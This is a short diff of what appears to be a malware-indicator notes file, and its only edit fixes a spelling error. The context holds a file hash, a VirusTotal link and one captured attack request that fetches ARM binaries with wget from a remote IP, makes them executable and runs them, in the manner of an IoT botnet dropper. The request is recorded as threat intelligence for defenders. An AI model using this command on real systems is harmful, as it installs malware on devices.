@@ -10,7 +10,7 @@ Malware Download:
 41a515f4232eedcb1391441aae4b2ab19e590d8d5ac5c3c44ab2d1bf28a175e9
 https://www.virustotal.com/gui/file/41a515f4232eedcb1391441aae4b2ab19e590d8d5ac5c3c44ab2d1bf28a175e9
 
-Malcious Commands seen:
+Malicious Commands seen:
 
 /shell?pkill+-9+arm;pkill+-9+arm7;cd+/tmp/;rm+-rf+most*;wget+http:/\\/103.228.37.236/most-arm7;+chmod+777+most-arm7;./most-arm7+exploitprivate;wget+http:/\\/103.228.37.236/most-arm;+chmod+777+most-arm;./most-arm+exploitprivate;rm+-rf+most*
 
